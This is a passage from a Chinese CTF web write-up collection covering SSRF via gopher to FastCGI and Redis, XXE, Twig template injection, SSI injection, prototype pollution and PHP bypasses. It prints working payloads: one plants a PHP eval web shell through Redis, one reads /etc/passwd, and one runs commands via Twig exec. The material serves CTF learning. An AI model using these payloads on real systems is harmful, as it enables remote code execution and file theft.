\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u751f\u6210 payload \u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c RCE</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Gopherus]\n\u2514\u2500$ python2 gopherus.py -h                                                             \nusage: gopherus.py [-h] [--exploit EXPLOIT]\n\noptional arguments:\n  -h, --help         show this help message and exit\n  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,\n                     pymemcache, rbmemcache, phpmemcache, dmpmemcache\n</code></pre> <p>\u6211\u4eec\u9009\u62e9 fastcgi \u7684</p> <pre><code>python2 gopherus.py --exploit fastcgi\n</code></pre> <p></p> <p>\u7136\u540e\u8f93\u5165 <code>/var/www/index.php</code>\uff0c\u8fd0\u884c\u4e00\u4e0b ls</p> <p></p> <p>\u5f97\u5230 payload</p> <p></p> <pre><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n</code></pre> <p>\u518d\u505a\u4e00\u6b21 URL \u7f16\u7801\uff08\u56e0\u4e3a\u8d70\u7684\u662f <code>?url</code>\uff09</p> <pre><code>gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6709\u4e2a <code>index.php</code></p> <p></p> <p>\u91cd\u65b0\u8dd1\u4e00\u4e0b\u811a\u672c\u62ff flag</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter15/15-9/","title":"Redis \u534f\u8bae RCE","text":""},{"location":"Web/Chapter15/15-9/#redis-\u534f\u8bae-rce","title":"Redis \u534f\u8bae RCE","text":""},{"location":"Web/Chapter15/15-9/#1-ssrf-\u4e0e-redis-\u7ed3\u5408\u7684\u6838\u5fc3\u601d\u8def","title":"1\ufe0f\u20e3 SSRF \u4e0e Redis \u7ed3\u5408\u7684\u6838\u5fc3\u601d\u8def","text":"<p>\u5229\u7528 SSRF\uff08Server-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\uff0c\u8ba9\u670d\u52a1\u5668\u4e3b\u52a8\u53bb\u8bf7\u6c42\u653b\u51fb\u8005\u6307\u5b9a\u7684 Redis \u670d\u52a1\uff08\u6216\u5185\u7f51\u672a\u6388\u6743\u7684 Redis \u670d\u52a1\uff09\uff0c\u5e76\u5411 Redis \u5199\u5165\u6076\u610f payload\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u5b9e\u73b0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09</p> <p>2\ufe0f\u20e3 SSRF Redis RCE \u5e38\u89c1\u5229\u7528\u94fe</p> \u9636\u6bb5 \u52a8\u4f5c \u7b2c\u4e00\u6b65 SSRF \u63a7\u5236\u76ee\u6807\u670d\u52a1\u8bf7\u6c42 Redis\uff08\u901a\u5e38\u4f7f\u7528 <code>gopher://</code> \u534f\u8bae\uff0c\u53ef\u4ee5\u4f2a\u9020 TCP payload\uff09 \u7b2c\u4e8c\u6b65 \u5411 Redis \u53d1\u9001\u5199\u5165\u547d\u4ee4\uff0c\u4fee\u6539\u5176\u914d\u7f6e\uff0c\u5982 <code>dir</code> \u548c <code>dbfilename</code> \u7b2c\u4e09\u6b65 \u5411 Redis \u5199\u5165 \u6076\u610f SSH \u516c\u94a5 \u6216 \u8ba1\u5212\u4efb\u52a1\u811a\u672c \u5230 Web \u6839\u76ee\u5f55\u6216 <code>.ssh/authorized_keys</code> \u7b2c\u56db\u6b65 \u89e6\u53d1 Redis \u4fdd\u5b58\uff08<code>SAVE</code>\uff09\uff0c\u5c06 payload \u5199\u5165\u78c1\u76d8\uff0c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6216\u63d0\u6743 <p>\u672c\u9898\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528 gopherus \u5b9e\u65bd\u653b\u51fb</p> <p></p> <p>\u518d URL \u7f16\u7801\u4e00\u6b21</p> <pre><code>gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n</code></pre> <p></p>"},{"location":"Web/Chapter16/16-1/","title":"\u6587\u4ef6\u8bfb\u53d6\u6ce8\u5165","text":""},{"location":"Web/Chapter16/16-1/#\u6587\u4ef6\u8bfb\u53d6\u6ce8\u5165","title":"\u6587\u4ef6\u8bfb\u53d6\u6ce8\u5165","text":"<p>\u6253\u5f00\u7f51\u9875\u662f\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u53d1\u73b0 ajax \u53d1\u9001\u7684\u662f xml \u5f62\u5f0f\u7684\u6570\u636e\uff0c\u5e94\u8be5\u5b58\u5728 XXE \u6ce8\u5165</p> <p></p> <p>\u6253\u5f00 BurpSuite \u6293\u5305\u8bf7\u6c42\u786e\u5b9a\u662f xml \u683c\u5f0f</p> <p></p> <p>\u6784\u9020 payload\uff0c\u5982\u56fe\u4e2d\u7684 xml \u683c\u5f0f</p> <p>\u7b2c\u4e00\u884c\u5148\u58f0\u660e XML \u7684\u7248\u672c\uff081.0\uff09\u548c\u7f16\u7801\uff08UTF-8\uff09</p> <p>\u7136\u540e\u58f0\u660e DOCTYPE\uff0c\u540d\u5b57\u81ea\u53d6</p> <p>\u7136\u540e\u518d\u58f0\u660e ENTITY\uff0c\u540d\u5b57\u81ea\u53d6</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;!DOCTYPE note[\n    &lt;!ENTITY admin SYSTEM \"file:///etc/passwd\"&gt;\n    ]&gt;\n&lt;user&gt;\n    &lt;username&gt;\n        &amp;admin;\n    &lt;/username&gt;\n    &lt;password&gt;\n        123\n    &lt;/password&gt;\n&lt;/user&gt;\n</code></pre> <p>SYSTEM \u6807\u8bc6\u7b26\u8868\u793a\u5916\u90e8\u5b9e\u4f53\u5f15\u7528\u4e00\u4e2a\u5916\u90e8\u8d44\u6e90\uff0c\u53ef\u4ee5\u662f\u6587\u4ef6\u6216 URL\uff0c\u4f20\u8fc7\u53bb\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter17/17-1/","title":"\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":""},{"location":"Web/Chapter17/17-1/#\u6a21\u677f\u6ce8\u5165\u653b\u51fb","title":"\u6a21\u677f\u6ce8\u5165\u653b\u51fb","text":"<p>\u67e5\u770b hint \u9875\u9762\u7ed9\u51fa\u4e86\u63d0\u793a</p> <p></p> <p>flag \u4f4d\u4e8e\u767b\u5f55\u9875\u9762</p> <p></p> <p>\u8f93\u5165\u6b63\u5e38\u503c\u767b\u5f55</p> <p></p> <p>\u5728 Cookie \u4e2d\u4fee\u6539 user \u503c\u6d4b\u8bd5\u5b58\u5728 SSTI \u6f0f\u6d1e</p> <p></p> <p>\u6784\u9020 payload</p>"},{"location":"Web/Chapter17/17-1/#_self","title":"<code>_self</code>","text":"<p>\u5728 Twig \u4e2d\uff0c<code>_self</code> \u4ee3\u8868\u5f53\u524d\u6a21\u677f\u5bf9\u8c61\uff0c\u901a\u5e38\u7528\u4e8e\u5f15\u7528\u5f53\u524d\u6a21\u677f\u4e0a\u4e0b\u6587\u4e2d\u7684\u67d0\u4e9b\u5c5e\u6027\u6216\u65b9\u6cd5</p> <p>\u8fd9\u91cc\uff0c\u5b83\u6307\u4ee3\u7684\u662f\u5f53\u524d\u6a21\u677f\u5b9e\u4f8b\u672c\u8eab</p>"},{"location":"Web/Chapter17/17-1/#env","title":"<code>env</code>","text":"<p><code>_self.env</code> \u662f\u5bf9 Twig \u73af\u5883\u5bf9\u8c61\u7684\u5f15\u7528</p> <p>Twig \u73af\u5883\u5bf9\u8c61\u662f\u4e00\u4e2a\u5305\u542b\u6240\u6709 Twig \u914d\u7f6e\u3001\u6269\u5c55\u548c\u5168\u5c40\u53d8\u91cf\u7684\u5bb9\u5668\u3002\u5728\u8fd9\u4e2a\u8f7d\u8377\u4e2d\uff0c<code>env</code> \u5bf9\u8c61\u63d0\u4f9b\u4e86\u5bf9 Twig \u5185\u90e8\u529f\u80fd\u7684\u8bbf\u95ee</p>"},{"location":"Web/Chapter17/17-1/#registerundefinedfiltercallbackexec","title":"<code>registerUndefinedFilterCallback(\"exec\")</code>","text":"<p><code>registerUndefinedFilterCallback</code> \u662f Twig \u73af\u5883\u5bf9\u8c61\u4e2d\u7684\u4e00\u4e2a\u65b9\u6cd5</p> <p>\u8be5\u65b9\u6cd5\u5141\u8bb8\u5f00\u53d1\u4eba\u5458\u6ce8\u518c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u5f53\u4f7f\u7528\u672a\u5b9a\u4e49\u7684\u8fc7\u6ee4\u5668\u65f6\uff0cTwig \u4f1a\u8c03\u7528\u8fd9\u4e2a\u56de\u8c03</p> <p>\u653b\u51fb\u8005\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\u5c06\u4e00\u4e2a\u56de\u8c03\u6ce8\u518c\u4e3a <code>\"exec\"</code>\uff0c\u5373\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u56de\u8c03</p>"},{"location":"Web/Chapter17/17-1/#getfilterid","title":"<code>getFilter(\"id\")</code>","text":"<p><code>getFilter(\"id\")</code> \u662f Twig \u73af\u5883\u5bf9\u8c61\u4e2d\u7684\u53e6\u4e00\u4e2a\u65b9\u6cd5</p> <p>\u5b83\u7528\u4e8e\u83b7\u53d6\u540d\u4e3a <code>\"id\"</code> \u7684\u8fc7\u6ee4\u5668\u5bf9\u8c61</p> <p>\u5728 Twig \u4e2d\uff0c\u8fc7\u6ee4\u5668\u7528\u4e8e\u5904\u7406\u548c\u8f6c\u6362\u6570\u636e</p> <p>\u901a\u5e38\uff0c<code>id</code> \u8fc7\u6ee4\u5668\u4f1a\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u4f46\u662f\u5982\u679c <code>id</code> \u8fc7\u6ee4\u5668\u4e0d\u5b58\u5728\uff0c\u5b83\u4f1a\u8c03\u7528\u4e4b\u524d\u6ce8\u518c\u7684 <code>registerUndefinedFilterCallback</code> \u56de\u8c03\u51fd\u6570</p> <pre><code>{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n</code></pre> <p></p>"},{"location":"Web/Chapter18/18-1/","title":"shtml \u6ce8\u5165","text":""},{"location":"Web/Chapter18/18-1/#shtml-\u6ce8\u5165","title":"shtml \u6ce8\u5165","text":"<p>\u6253\u5f00\u9875\u9762\u5982\u4e0b</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u62ff\u5230\u5907\u4efd\u6587\u4ef6</p> <pre><code>F:\\Tools\\WEB\\Python-Tools\\dirsearch-master&gt;python3 dirsearch.py -u \"http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\" -t 10 -s 1\n\n  _|. _ _  _  _  _ _|_    v0.4.1\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 10 | Wordlist size: 10849\n\nError Log: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\logs\\errors-21-04-16_16-37-46.log\n\nTarget: http://82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn/\n\nOutput File: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\reports\\82e12f9d-f5e7-44cd-b5bc-13e1f75f81a9.node3.buuoj.cn\\_21-04-16_16-37-46.txt\n\n[16:37:46] Starting:\n[16:37:46] 200 -    1KB - /index.php.swp\n</code></pre> <p>\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n    ob_start();\n    function get_hash(){\n        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-';\n        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n        $content = uniqid().$random;\n        return sha1($content); \n    }\n    header(\"Content-Type: text/html;charset=utf-8\");\n    ***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ($admin == substr(md5($_POST['password']),0,6)) {\n            echo \"&lt;script&gt;alert('[+] Welcome to manage system')&lt;/script&gt;\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            &lt;h1&gt;Hello,'.$_POST['username'].'&lt;/h1&gt;\n            ***\n            ***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n            echo \"[!] Header  error ...\";\n        } else {\n            echo \"&lt;script&gt;alert('[!] Failed')&lt;/script&gt;\";\n\n    }else\n    {\n    ***\n    }\n    ***\n?&gt;\n</code></pre> <p>\u5173\u952e\u70b9\u5728\uff0c\u5bc6\u7801\u7684MD5\u503c\u7684\u524d\u516d\u4f4d\u9700\u8981\u7b49\u4e8e 6d0bc1</p> <p>\u7f16\u5199\u811a\u672c\u7206\u7834</p> <pre><code>import hashlib\nimport threading\n\nthread_ = threading.Semaphore(30)\n\ndef abc(left,right):\n    thread_.acquire()\n    admin = '6d0bc1'\n    for i in range(left, right):\n        s = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n        if s[:6] == admin:\n            print(i)\n    thread_.release()\n\n\nif __name__ == '__main__':\n    thread_list = []\n    thread_count = 5\n    for i in range(thread_count):\n        t = threading.Thread(target=abc, args=(i*2000000,(i+1)*2000000))\n        thread_list.append(t)\n\n    for t in thread_list:\n        t.start()\n    for t in thread_list:\n        t.join()\n</code></pre> <p>\u5f97\u5230\u53ef\u7528\u5bc6\u7801</p> <pre><code>2020666\n2305004\n9162671\n</code></pre> <p>\u8f93\u5165 admin \u548c\u5bc6\u7801\u767b\u5f55</p> <p></p> <p>\u53d1\u73b0\u54cd\u5e94\u5934\u4e2d\u6709 shtml</p> <p></p> <p>\u60f3\u5230\u5229\u7528 shtml \u7684 SSI \u6ce8\u5165\u6f0f\u6d1e\uff0c\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762</p> <p></p> <p>\u7528\u6237\u540d\u56de\u663e\u5230\u4e86\u9875\u9762\u4e0a\uff0c\u5229\u7528\u8fd9\u4e2a\u53c2\u6570\u53bb\u6ce8\u5165</p> <p></p> <p>\u518d\u6b21\u8bbf\u95ee\u62ff\u5230 flag \u6587\u4ef6\u540d</p> <p></p> <p>\u6784\u9020 payload \u8bbf\u95ee flag</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter19/19-1/","title":"\u53d8\u91cf\u8986\u76d6","text":""},{"location":"Web/Chapter19/19-1/#\u8986\u76d6\u53d8\u91cf","title":"\u8986\u76d6\u53d8\u91cf","text":"<p>\u626b\u63cf\u76ee\u5f55\u62ff\u5230\u6e90\u7801</p> <pre><code>var express = require('express');\nconst setFn = require('set-value');\nvar router = express.Router();\n\n\nconst Admin = {\n    \"password\":process.env.password?process.env.password:\"password\"\n}\n\n\nrouter.post(\"/getflag\", function (req, res, next) {\n    if (req.body.password === undefined || req.body.password === req.session.challenger.password){\n        res.send(\"\u767b\u5f55\u5931\u8d25\");\n    }else{\n        if(req.session.challenger.age &gt; 79){\n            res.send(\"\u7cdf\u8001\u5934\u5b50\u574f\u6ef4\u5f88\");\n        }\n        let key = req.body.key.toString();\n        let password = req.body.password.toString();\n        if(Admin[key] === password){\n            res.send(process.env.flag ? process.env.flag : \"flag{test}\");\n        }else {\n            res.send(\"\u5bc6\u7801\u9519\u8bef\uff0c\u8bf7\u4f7f\u7528\u7ba1\u7406\u5458\u7528\u6237\u540d\u767b\u5f55.\");\n        }\n    }\n\n});\nrouter.get('/reg', function (req, res, next) {\n    req.session.challenger = {\n        \"username\": \"user\",\n        \"password\": \"pass\",\n        \"age\": 80\n    }\n    res.send(\"\u7528\u6237\u521b\u5efa\u6210\u529f!\");\n});\n\nrouter.get('/', function (req, res, next) {\n    res.redirect('index');\n});\nrouter.get('/index', function (req, res, next) {\n    res.send('&lt;title&gt;BUGKU-\u767b\u5f55&lt;/title&gt;&lt;h1&gt;\u524d\u7aef\u88ab\u7092\u4e86&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=\"./reg\"&gt;\u6ce8\u518c&lt;/a&gt;');\n});\nrouter.post(\"/update\", function (req, res, next) {\n    if(req.session.challenger === undefined){\n        res.redirect('/reg');\n    }else{\n        if (req.body.attrkey === undefined || req.body.attrval === undefined) {\n            res.send(\"\u4f20\u53c2\u6709\u8bef\");\n        }else {\n            let key = req.body.attrkey.toString();\n            let value = req.body.attrval.toString();\n            setFn(req.session.challenger, key, value);\n            res.send(\"\u4fee\u6539\u6210\u529f\");\n        }\n    }\n});\n\nmodule.exports = router;\n</code></pre> <p>\u9996\u5148\u5206\u6790\u767b\u5f55\u7684\u8def\u7531</p> <p>\u5f53\u6211\u4eec\u8bf7\u6c42\u7684\u5bc6\u7801 password \u4e0d\u4e3a\u7a7a\uff0cage \u8981\u5c0f\u4e8e 79,\u5e76\u4e14\u5bc6\u7801\u7b49\u4e8e admin \u7684\u5bc6\u7801\u5c31\u767b\u9646\u6210\u529f\u83b7\u5f97 flag</p> <pre><code>router.post(\"/getflag\", function (req, res, next) {\n    // 1. \u5bc6\u7801\u57fa\u7840\u9a8c\u8bc1\n    if (req.body.password === undefined || req.body.password === req.session.challenger.password){\n        res.send(\"\u767b\u5f55\u5931\u8d25\");\n    }else{\n        // 2. \u5e74\u9f84\u68c0\u67e5\n        if(req.session.challenger.age &gt; 79){\n            res.send(\"\u7cdf\u8001\u5934\u5b50\u574f\u6ef4\u5f88\");\n        }\n\n        // 3. \u53c2\u6570\u5904\u7406\n        let key = req.body.key.toString();\n        let password = req.body.password.toString();\n\n        // 4. \u7ba1\u7406\u5458\u9a8c\u8bc1\n        if(Admin[key] === password){\n            res.send(process.env.flag ? process.env.flag : \"flag{test}\");\n        }else {\n            res.send(\"\u5bc6\u7801\u9519\u8bef\uff0c\u8bf7\u4f7f\u7528\u7ba1\u7406\u5458\u7528\u6237\u540d\u767b\u5f55.\");\n        }\n    }\n});\n</code></pre> <p>\u518d\u770b\u770b\u6ce8\u518c\u8def\u7531</p> <p>\u8fd9\u91cc\u521b\u5efa\u7684\u7528\u6237\u9ed8\u8ba4 age=80\uff0c\u9700\u8981\u4fee\u6539</p> <pre><code>router.get('/reg', function (req, res, next) {\n    req.session.challenger = {\n        \"username\": \"user\",\n        \"password\": \"pass\",\n        \"age\": 80\n    }\n    res.send(\"\u7528\u6237\u521b\u5efa\u6210\u529f!\");\n});\n</code></pre> <p></p> <p>\u518d\u53bb\u770b\u770b\u53e6\u4e00\u4e2a\u8def\u7531</p> <pre><code>router.post(\"/update\", function (req, res, next) {\n    // 1. \u68c0\u67e5\u4f1a\u8bdd\u4e2d\u662f\u5426\u6709challenger\u5bf9\u8c61\n    if(req.session.challenger === undefined){\n        res.redirect('/reg');\n    }else{\n        // 2. \u68c0\u67e5\u8bf7\u6c42\u4f53\u53c2\u6570\u662f\u5426\u5b8c\u6574\n        if (req.body.attrkey === undefined || req.body.attrval === undefined) {\n            res.send(\"\u4f20\u53c2\u6709\u8bef\");\n        }else {\n            // 3. \u83b7\u53d6\u5e76\u8f6c\u6362\u53c2\u6570\n            let key = req.body.attrkey.toString();\n            let value = req.body.attrval.toString();\n\n            // 4. \u4f7f\u7528setFn\u66f4\u65b0\u5c5e\u6027\n            setFn(req.session.challenger, key, value);\n\n            // 5. \u8fd4\u56de\u6210\u529f\u54cd\u5e94\n            res.send(\"\u4fee\u6539\u6210\u529f\");\n        }\n    }\n});\n</code></pre> <p>\u6f0f\u6d1e\u4f4d\u4e8e setFn() \u51fd\u6570\u4e2d</p> <p>\u5982\u679c\u653b\u51fb\u8005\u63a7\u5236<code>attrkey</code>\u53c2\u6570\u4e3a<code>__proto__.polluted</code> \u4fee\u6539 Object \u7684\u539f\u578b\uff0c\u5f71\u54cd\u6240\u6709\u5bf9\u8c61</p> <p>\u5229\u7528\u8fd9\u4e2a\u8def\u7531\u53bb\u66f4\u65b0 age \u5c5e\u6027\u5c0f\u4e8e 79</p> <pre><code>attrkey=age&amp;attrval=20\n</code></pre> <p></p> <p>\u518d\u4fee\u6539\u5bc6\u7801\u548c admin \u4e00\u81f4</p> <pre><code>attrkey=__proto__.pwd&amp;attrval=admin\n</code></pre> <p>\u7136\u540e\u767b\u9646\u83b7\u53d6 flag</p> <pre><code>password=admin&amp;key=pwd\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-1/","title":"\u6570\u5b57\u5b57\u7b26\u4e32\u7ed5\u8fc7 ==","text":""},{"location":"Web/Chapter2/2-1/#\u6570\u5b57\u5b57\u7b26\u4e32\u7ed5\u8fc7-","title":"\u6570\u5b57\u5b57\u7b26\u4e32\u7ed5\u8fc7 ==","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801\uff0cis_numeric() \u51fd\u6570\u7528\u4e8e\u68c0\u6d4b\u53d8\u91cf\u662f\u5426\u4e3a\u6570\u5b57\u6216\u6570\u5b57\u5b57\u7b26\u4e32</p> <p></p> <p>\u5728 PHP \u4e2d\uff0c== \u662f\u4e00\u79cd\u5f31\u7c7b\u578b\u6bd4\u8f83</p> <p>\u5982\u679c\u53d1\u73b0\u4e24\u8fb9\u7684\u7c7b\u578b\u4e0d\u540c\uff0c\u5219\u9996\u5148\u8f6c\u6362\u4e3a\u76f8\u540c\u7c7b\u578b\u518d\u6bd4\u8f83</p> <p>\u6570\u5b57\u5b57\u7b26\u4e32\u8f6c\u4e3a\u6570\u5b57\u7c7b\u578b\u65b9\u6cd5\u5c31\u662f\u63d0\u53d6\u5176\u4e2d\u7684\u6570\u5b57</p> <p></p>"},{"location":"Web/Chapter2/2-10/","title":"\u7a7a\u683c\u7ed5\u8fc7 WAF","text":""},{"location":"Web/Chapter2/2-10/#\u7a7a\u683c\u7ed5\u8fc7-waf","title":"\u7a7a\u683c\u7ed5\u8fc7 WAF","text":"<p>\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0 ajax \u8bf7\u6c42\uff0cURL \u8ddf\u4e0a\u8fd9\u4e2a\u6587\u4ef6\u540d\u53bb\u770b\u770b</p> <p></p> <p>\u62ff\u5230\u4e86\u6e90\u7801\uff0c\u505a\u4e86\u8fc7\u6ee4</p> <p></p> <p>\u6570\u5b57\u53ef\u4ee5\u4f20\u5165</p> <p></p> <p>\u5b57\u7b26\u5219\u4e0d\u884c</p> <p></p> <p>\u67e5\u8be2\u5b57\u7b26\u4e32\u5728\u89e3\u6790\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u5c06\u67d0\u4e9b\u5b57\u7b26\u5220\u9664\u6216\u7528\u4e0b\u5212\u7ebf\u4ee3\u66ff</p> <p>\u4f8b\u5982\u5c06\u53c2\u6570\u524d\u7684\u7a7a\u683c\u5220\u9664</p> <p>\u4f46\u662f WAF \u4f1a\u56e0\u4e3a\u8fd9\u4e2a\u7a7a\u683c\u5bfc\u81f4\u68c0\u6d4b\u4e0d\u5230 num \u8fd9\u4e2a\u53c2\u6570\uff0c\u6700\u7ec8\u5bfc\u81f4 WAF \u88ab\u7ed5\u8fc7</p> <p></p> <p>\u540e\u9762\u7684\u5e38\u89c4\u64cd\u4f5c\u5bf9\u5b57\u7b26\u90fd\u505a\u4e86\u8fc7\u6ee4\uff0c\u5747\u4f7f\u7528 chr() \u4ee3\u66ff</p> <p></p> <p>\u6709\u4e00\u4e2a f1agg</p> <p></p> <p>\u4f7f\u7528 file_get_contents() \u628a\u6574\u4e2a\u6587\u4ef6\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u4e2d\uff0c\u6700\u540e\u8f93\u51fa\u62ff\u5230 flagnpm</p> <p></p>"},{"location":"Web/Chapter2/2-11/","title":"data \u4f2a\u534f\u8bae","text":""},{"location":"Web/Chapter2/2-11/#data-\u4f2a\u534f\u8bae","title":"data \u4f2a\u534f\u8bae","text":"<p>\u9996\u5148 text \u53c2\u6570\u5f97\u5b58\u5728\uff0c\u800c\u4e14\u5fc5\u987b\u4f20\u5165\u6587\u4ef6\u540c\u65f6\u5176\u503c\u8981\u662f welcome\u2026\u2026</p> <p></p> <p>\u53ef\u4ee5\u4f7f\u7528 data:// \u6570\u636e\u6d41\u5c01\u88c5\u5668</p> <pre><code>data://text/plain;base64,\u6570\u636e\u5185\u5bb9\n\n?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= \n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-12/","title":"call_user_func() \u51fd\u6570","text":""},{"location":"Web/Chapter2/2-12/#call_user_func-\u51fd\u6570","title":"call_user_func() \u51fd\u6570","text":"<p>\u6253\u5f00\u7f51\u7ad9\u8fc7\u4e86\u4e00\u4f1a\u81ea\u5df1\u62a5\u9519\u4e86</p> <p></p> <p>\u6253\u5f00 BurpSuite \u6293\u5305\u62ff\u5230\u53c2\u6570\uff0cfunc \u4f20\u5165\u7684\u662f date</p> <p>\u6839\u636e\u62a5\u9519\u63a8\u6d4b\u51fa\u8fd9\u4e2a\u53c2\u6570\u662f\u7528\u6765\u8c03\u7528\u51fd\u6570\u7684\uff0cp \u5c31\u662f\u51fd\u6570\u7684\u53c2\u6570</p> <p></p> <p>\u6709\u7ecf\u9a8c\u7684\u80fd\u5206\u6790\u51fa\u662f call_user_func() \u51fd\u6570</p> <p>\u7528\u6cd5\u5462\u5982\u56fe\u6240\u793a</p> <p></p> <p>\u4f7f\u7528 file_get_contents() \u51fd\u6570\u6765\u8bfb\u53d6\u6e90\u7801</p> <p></p> <p>\u770b\u5230\u6709\u4e00\u4e2a Test \u7c7b\u4ee5\u53ca\u6ca1\u6709\u7981\u7528 system\u3001unserialize</p> <p></p> <p>\u901a\u8fc7\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u6539 func \u548c p \u7684\u503c\uff0c\u7136\u540e\u8c03\u7528 gettime() \u6267\u884c</p> <p></p> <p>\u4f20\u53c2\u8fc7\u53bb\u62ff\u5230\u6240\u6709\u6709\u5173 flag \u7684\u6587\u4ef6</p> <p></p> <p>\u518d\u91cd\u65b0\u5e8f\u5217\u5316\u67e5\u770b\u6587\u4ef6</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter2/2-13/","title":"\u79d1\u5b66\u8ba1\u6570\u6cd5 e \u7b26\u53f7\u7ed5\u8fc7 intval()","text":""},{"location":"Web/Chapter2/2-13/#\u79d1\u5b66\u8ba1\u6570\u6cd5-e-\u7b26\u53f7\u7ed5\u8fc7-intval","title":"\u79d1\u5b66\u8ba1\u6570\u6cd5 e \u7b26\u53f7\u7ed5\u8fc7 intval()","text":"<p>\u9996\u5148\u5728 <code>robots.txt</code> \u4e0b\u53d1\u73b0 <code>/fAke_f1agggg.php</code></p> <p></p> 